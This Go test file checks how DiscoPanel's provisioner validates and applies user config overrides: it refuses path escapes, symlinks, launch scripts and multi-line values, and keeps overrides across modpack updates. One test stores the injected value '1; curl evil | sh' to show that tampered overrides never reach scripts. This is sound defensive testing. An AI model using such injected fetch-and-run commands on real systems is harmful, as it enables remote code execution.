package provisioner

import (
	"archive/zip"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/discohaus/discopanel/pkg/config"
	"github.com/discohaus/discopanel/pkg/logger"
	v1 "github.com/discohaus/discopanel/pkg/proto/discopanel/v1"
	"github.com/discohaus/discopanel/pkg/runtimespec"
)

func TestNormalizeConfigOverrides(t *testing.T) {
	dataPath := t.TempDir()
	entry := func(k, v string) *v1.ConfigOverrideEntry { return &v1.ConfigOverrideEntry{Key: k, Value: v} }
	cases := []struct {
		name    string
		file    *v1.ConfigOverrideFile
		path    string
		wantErr string
	}{
		{"cleans path", &v1.ConfigOverrideFile{Path: " /data/config\\create-server.toml ", Entries: []*v1.ConfigOverrideEntry{entry(" a.b ", "1")}}, "config/create-server.toml", ""},
		{"explicit format cannot widen extensions", &v1.ConfigOverrideFile{Path: "config/x.conf", Format: v1.ConfigFormat_CONFIG_FORMAT_JSON}, "", "not a json file"},
		{"escape rejected", &v1.ConfigOverrideFile{Path: "../other/x.toml"}, "", "outside"},
		{"state dir rejected", &v1.ConfigOverrideFile{Path: ".discopanel/launch.json"}, "", "panel state"},
		{"state dir case rejected", &v1.ConfigOverrideFile{Path: "./.DiscoPanel/x.json"}, "", "panel state"},
		{"server properties rejected", &v1.ConfigOverrideFile{Path: "server.properties"}, "", "Properties tab"},
		{"panel files match any case", &v1.ConfigOverrideFile{Path: "Server.Properties"}, "", "Properties tab"},
		{"explicit format must match extension", &v1.ConfigOverrideFile{Path: "config/a.json", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES}, "", "not a properties file"},
		{"explicit matching format accepted", &v1.ConfigOverrideFile{Path: "config/a.json5", Format: v1.ConfigFormat_CONFIG_FORMAT_JSON}, "config/a.json5", ""},
		{"script rejected", &v1.ConfigOverrideFile{Path: "run.sh", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES}, "", "launches the server"},
		{"batch rejected", &v1.ConfigOverrideFile{Path: "RUN.BAT"}, "", "launches the server"},
		{"jvm args rejected", &v1.ConfigOverrideFile{Path: "user_jvm_args.txt", Format: v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES}, "", "launches the server"},
		{"nested args rejected", &v1.ConfigOverrideFile{Path: "libraries/net/forge/unix_args.txt"}, "", "launches the server"},
		{"jar rejected", &v1.ConfigOverrideFile{Path: "mods/a.jar"}, "", "launches the server"},
		{"unknown type rejected", &v1.ConfigOverrideFile{Path: "config/x.conf"}, "", "unsupported"},
		{"bad key rejected", &v1.ConfigOverrideFile{Path: "a.toml", Entries: []*v1.ConfigOverrideEntry{entry("a..b", "1")}}, "", "empty segment"},
		{"duplicate key rejected", &v1.ConfigOverrideFile{Path: "a.toml", Entries: []*v1.ConfigOverrideEntry{entry("a", "1"), entry("a", "2")}}, "", "twice"},
		{"multi-line value rejected", &v1.ConfigOverrideFile{Path: "a.toml", Entries: []*v1.ConfigOverrideEntry{entry("a", "1\n2")}}, "", "single line"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := NormalizeConfigOverrides(dataPath, []*v1.ConfigOverrideFile{tc.file})
			if tc.wantErr != "" {
				if err == nil || !strings.Contains(err.Error(), tc.wantErr) {
					t.Fatalf("err = %v, want %q", err, tc.wantErr)
				}
				return
			}
			if err != nil {
				t.Fatal(err)
			}
			if got[0].Path != tc.path {
				t.Fatalf("path = %q, want %q", got[0].Path, tc.path)
			}
		})
	}

	// Symlinks out of the data dir are refused too
	outside := t.TempDir()
	if err := os.Symlink(outside, filepath.Join(dataPath, "link")); err != nil {
		t.Fatal(err)
	}
	if _, err := NormalizeConfigOverrides(dataPath, []*v1.ConfigOverrideFile{{Path: "link/x.toml"}}); err == nil {
		t.Fatal("symlinked escape accepted")
	}
	if _, err := NormalizeConfigOverrides(dataPath, []*v1.ConfigOverrideFile{{Path: "a.toml"}, {Path: "./a.toml"}}); err == nil {
		t.Fatal("duplicate path accepted")
	}

	// Existing targets must be text
	for name, content := range map[string]string{"bin.properties": "a=1\x00\x01", "latin.properties": "a=\xff\xfe"} {
		if err := os.WriteFile(filepath.Join(dataPath, name), []byte(content), 0644); err != nil {
			t.Fatal(err)
		}
		if _, err := NormalizeConfigOverrides(dataPath, []*v1.ConfigOverrideFile{{Path: name}}); err == nil {
			t.Fatalf("%s: non-text target accepted", name)
		}
	}
}

// Stored overrides are revalidated, a tampered file cannot reach scripts
func TestApplyRevalidatesStoredOverrides(t *testing.T) {
	dataPath := t.TempDir()
	server := &v1.Server{Id: "s1", Name: "test", DataPath: dataPath}
	var lines []string
	p := New(nil, nil, &config.Config{}, nil, logger.New())
	p.SetProgressSink(func(_ string, msg string) { lines = append(lines, msg) })

	originals := map[string]string{
		"run.sh":              "#!/bin/sh\njava -jar server.jar\n",
		"user_jvm_args.txt":   "-Xmx4G\n",
		"config/a.json":       "{\"general\": {\"max\": 1}}\n",
		"config/bin.toml":     "a = 1\x00\n",
		"Server.Properties":   "motd=hi\n",
		"config/scripts.json": "{}\n",
	}
	var list []*v1.ConfigOverrideFile
	for rel, content := range originals {
		full := filepath.Join(dataPath, filepath.FromSlash(rel))
		if err := os.MkdirAll(filepath.Dir(full), 0755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(full, []byte(content), 0755); err != nil {
			t.Fatal(err)
		}
		format := v1.ConfigFormat_CONFIG_FORMAT_PROPERTIES
		if rel == "config/bin.toml" {
			format = v1.ConfigFormat_CONFIG_FORMAT_UNSPECIFIED
		}
		list = append(list, &v1.ConfigOverrideFile{Path: rel, Format: format, Entries: []*v1.ConfigOverrideEntry{
			{Key: "x", Value: "1; curl evil | sh"}, {Key: "general.max", Value: "7"},
		}})
	}
	if err := runtimespec.WriteConfigOverrides(dataPath, &v1.ConfigOverrides{Files: list}); err != nil {
		t.Fatal(err)
	}
	p.applyConfigOverrides(server)
	for rel, content := range originals {
		data, _ := os.ReadFile(filepath.Join(dataPath, filepath.FromSlash(rel)))
		if string(data) != content {
			t.Fatalf("%s was modified:\n%s", rel, data)
		}
	}
	if len(lines) < len(originals) {
		t.Fatalf("each refused file should be reported: %v", lines)
	}
}

func TestOverrideWriteKeepsModeAndIsAtomic(t *testing.T) {
	dataPath := t.TempDir()
	server := &v1.Server{Id: "s1", Name: "test", DataPath: dataPath}
	p := New(nil, nil, &config.Config{}, nil, logger.New())
	target := filepath.Join(dataPath, "config", "a.toml")
	if err := os.MkdirAll(filepath.Dir(target), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(target, []byte("[a]\nb = 1\n"), 0600); err != nil {
		t.Fatal(err)
	}
	// Symlinked configs stay links, the real file is edited
	if err := os.Symlink("a.toml", filepath.Join(dataPath, "config", "link.toml")); err != nil {
		t.Fatal(err)
	}
	if err := runtimespec.WriteConfigOverrides(dataPath, &v1.ConfigOverrides{Files: []*v1.ConfigOverrideFile{
		{Path: "config/link.toml", Entries: []*v1.ConfigOverrideEntry{{Key: "a.b", Value: "2"}}},
	}}); err != nil {
		t.Fatal(err)
	}
	p.applyConfigOverrides(server)
	data, _ := os.ReadFile(target)
	if string(data) != "[a]\nb = 2\n" {
		t.Fatalf("target = %q", data)
	}
	info, err := os.Stat(target)
	if err != nil || info.Mode().Perm() != 0600 {
		t.Fatalf("mode = %v, %v", info.Mode(), err)
	}
	if li, err := os.Lstat(filepath.Join(dataPath, "config", "link.toml")); err != nil || li.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("symlink replaced: %v", err)
	}
	entries, _ := os.ReadDir(filepath.Dir(target))
	if len(entries) != 2 {
		t.Fatalf("temp files left behind: %v", entries)
	}
}

// Writes a zip holding one pack config under pack/
func packZip(t *testing.T, rel, content string) string {
	t.Helper()
	var buf bytes.Buffer
	w := zip.NewWriter(&buf)
	f, err := w.Create("pack/" + rel)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := f.Write([]byte(content)); err != nil {
		t.Fatal(err)
	}
	if err := w.Close(); err != nil {
		t.Fatal(err)
	}
	zipPath := filepath.Join(t.TempDir(), "pack.zip")
	if err := os.WriteFile(zipPath, buf.Bytes(), 0644); err != nil {
		t.Fatal(err)
	}
	return zipPath
}

func TestConfigOverridesSurvivePackUpdate(t *testing.T) {
	dataPath := t.TempDir()
	server := &v1.Server{Id: "s1", Name: "test", DataPath: dataPath}
	var lines []string
	p := New(nil, nil, &config.Config{}, nil, logger.New())
	p.SetProgressSink(func(_ string, msg string) { lines = append(lines, msg) })

	if err := runtimespec.WriteConfigOverrides(dataPath, &v1.ConfigOverrides{Files: []*v1.ConfigOverrideFile{
		{Path: "config/create-server.toml", Entries: []*v1.ConfigOverrideEntry{
			{Key: "kinetics.maxBeltLength", Value: "64"},
			{Key: "kinetics.maxBeltLength.deep", Value: "1"},
		}},
		{Path: "config/ftbchunks-world.snbt", Entries: []*v1.ConfigOverrideEntry{{Key: "max_claimed_chunks", Value: "1000"}}},
		{Path: "config/missing.json", Entries: []*v1.ConfigOverrideEntry{{Key: "a", Value: "1"}}},
	}}); err != nil {
		t.Fatal(err)
	}

	install := func(version string) {
		t.Helper()
		toml := "# Create config " + version + "\n[kinetics]\n\t# Max belt length\n\tmaxBeltLength = 20\n\tnewIn" + version + " = true\n"
		for rel, content := range map[string]string{
			"config/create-server.toml":   toml,
			"config/ftbchunks-world.snbt": "{\n\t# Max claims\n\tmax_claimed_chunks: 500\n}\n",
		} {
			reader, err := zip.OpenReader(packZip(t, rel, content))
			if err != nil {
				t.Fatal(err)
			}
			// A forced pack update overwrites the user's file wholesale
			if err := p.extractServerPack(reader, dataPath, false, nil, newPackFileSet(dataPath)); err != nil {
				t.Fatal(err)
			}
			reader.Close()
		}
		p.applyConfigOverrides(server)
	}

	for _, version := range []string{"V1", "V2"} {
		lines = nil
		install(version)
		toml, _ := os.ReadFile(filepath.Join(dataPath, "config", "create-server.toml"))
		for _, want := range []string{"# Create config " + version, "\t# Max belt length\n\tmaxBeltLength = 64\n", "newIn" + version + " = true"} {
			if !strings.Contains(string(toml), want) {
				t.Fatalf("%s: toml lacks %q:\n%s", version, want, toml)
			}
		}
		snbt, _ := os.ReadFile(filepath.Join(dataPath, "config", "ftbchunks-world.snbt"))
		if !strings.Contains(string(snbt), "\t# Max claims\n\tmax_claimed_chunks: 1000\n") {
			t.Fatalf("%s: snbt override lost:\n%s", version, snbt)
		}
		joined := strings.Join(lines, "\n")
		for _, want := range []string{"config/create-server.toml: applied 1 of 2 keys", "kinetics.maxBeltLength.deep: kinetics.maxBeltLength is a value", "config/missing.json: file not found yet"} {
			if !strings.Contains(joined, want) {
				t.Fatalf("%s: console lacks %q:\n%s", version, want, joined)
			}
		}
	}

	// A start with nothing to change stays quiet and leaves files alone
	lines = nil
	p.applyConfigOverrides(server)
	if strings.Contains(strings.Join(lines, "\n"), "applied") {
		t.Fatalf("unchanged files rewritten: %v", lines)
	}
}

func TestConfigOverridesParseErrorDoesNotFail(t *testing.T) {
	dataPath := t.TempDir()
	server := &v1.Server{Id: "s1", Name: "test", DataPath: dataPath}
	var lines []string
	p := New(nil, nil, &config.Config{}, nil, logger.New())
	p.SetProgressSink(func(_ string, msg string) { lines = append(lines, msg) })

	broken := "{ \"a\": "
	if err := os.WriteFile(filepath.Join(dataPath, "broken.json"), []byte(broken), 0644); err != nil {
		t.Fatal(err)
	}
	if err := runtimespec.WriteConfigOverrides(dataPath, &v1.ConfigOverrides{Files: []*v1.ConfigOverrideFile{
		{Path: "broken.json", Entries: []*v1.ConfigOverrideEntry{{Key: "a", Value: "1"}}},
	}}); err != nil {
		t.Fatal(err)
	}
	p.applyConfigOverrides(server)
	if data, _ := os.ReadFile(filepath.Join(dataPath, "broken.json")); string(data) != broken {
		t.Fatalf("unparseable file was modified: %s", data)
	}
	if !strings.Contains(strings.Join(lines, "\n"), "did not parse") {
		t.Fatalf("parse error not reported: %v", lines)
	}
}
